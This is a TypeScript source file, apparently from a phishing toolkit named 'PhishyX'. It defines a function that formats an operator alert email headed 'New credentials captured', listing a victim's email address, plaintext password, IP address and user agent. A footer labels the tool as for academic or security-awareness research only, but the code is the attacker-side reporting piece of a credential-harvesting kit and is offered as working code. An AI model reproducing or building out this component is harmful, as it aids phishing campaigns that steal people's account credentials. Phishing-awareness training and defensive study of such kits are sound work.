export function generateCredentialsEmail(
  email: string,
  password: string,
  ip: string,
  userAgent: string
): { subject: string; html: string; text: string } {
  const subject = `[PhishyX] New credentials captured`;
  const timestamp = new Date().toISOString();

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>${subject}</title>
</head>
<body style="margin:0;padding:0;background-color:#0d0d0d;font-family:'Courier New',Courier,monospace;">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
    <tr>
      <td align="center" style="padding:40px 0;">
        <table role="presentation" width="600" cellspacing="0" cellpadding="0" border="0"
          style="background:#111111;border:1px solid #00ff88;border-radius:6px;overflow:hidden;">

          <!-- Header -->
          <tr>
            <td style="background:#00ff88;padding:16px 32px;">
              <p style="margin:0;color:#0d0d0d;font-size:13px;font-weight:bold;letter-spacing:2px;text-transform:uppercase;">
                PhishyX &mdash; Credential Capture
              </p>
            </td>
          </tr>

          <!-- Timestamp -->
          <tr>
            <td style="padding:20px 32px 0;">
              <p style="margin:0;color:#555555;font-size:11px;letter-spacing:1px;">
                CAPTURED AT &nbsp;&bull;&nbsp; ${timestamp}
              </p>
            </td>
          </tr>

          <!-- Credentials -->
          <tr>
            <td style="padding:20px 32px;">
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"
                style="border:1px solid #1e1e1e;border-radius:4px;overflow:hidden;">

                <tr style="border-bottom:1px solid #1e1e1e;">
                  <td style="padding:14px 20px;background:#161616;width:120px;">
                    <p style="margin:0;color:#00ff88;font-size:11px;letter-spacing:1px;text-transform:uppercase;">Email</p>
                  </td>
                  <td style="padding:14px 20px;background:#161616;">
                    <p style="margin:0;color:#ffffff;font-size:15px;">${email}</p>
                  </td>
                </tr>

                <tr style="border-bottom:1px solid #1e1e1e;">
                  <td style="padding:14px 20px;background:#111111;width:120px;">
                    <p style="margin:0;color:#00ff88;font-size:11px;letter-spacing:1px;text-transform:uppercase;">Password</p>
                  </td>
                  <td style="padding:14px 20px;background:#111111;">
                    <p style="margin:0;color:#ffffff;font-size:15px;letter-spacing:2px;">${password}</p>
                  </td>
                </tr>

                <tr style="border-bottom:1px solid #1e1e1e;">
                  <td style="padding:14px 20px;background:#161616;width:120px;">
                    <p style="margin:0;color:#888888;font-size:11px;letter-spacing:1px;text-transform:uppercase;">IP</p>
                  </td>
                  <td style="padding:14px 20px;background:#161616;">
                    <p style="margin:0;color:#aaaaaa;font-size:13px;">${ip}</p>
                  </td>
                </tr>

                <tr>
                  <td style="padding:14px 20px;background:#111111;width:120px;">
                    <p style="margin:0;color:#888888;font-size:11px;letter-spacing:1px;text-transform:uppercase;">User Agent</p>
                  </td>
                  <td style="padding:14px 20px;background:#111111;">
                    <p style="margin:0;color:#aaaaaa;font-size:11px;word-break:break-all;">${userAgent}</p>
                  </td>
                </tr>

              </table>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="padding:16px 32px;border-top:1px solid #1e1e1e;">
              <p style="margin:0;color:#333333;font-size:10px;letter-spacing:1px;">
                FOR ACADEMIC / SECURITY AWARENESS RESEARCH ONLY &mdash; PHISHYX
              </p>
            </td>
          </tr>

        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;

  const text = `[PhishyX] Credential Capture\n\nTimestamp : ${timestamp}\nEmail     : ${email}\nPassword  : ${password}\nIP        : ${ip}\nUser-Agent: ${userAgent}`;

  return { subject, html, text };
}
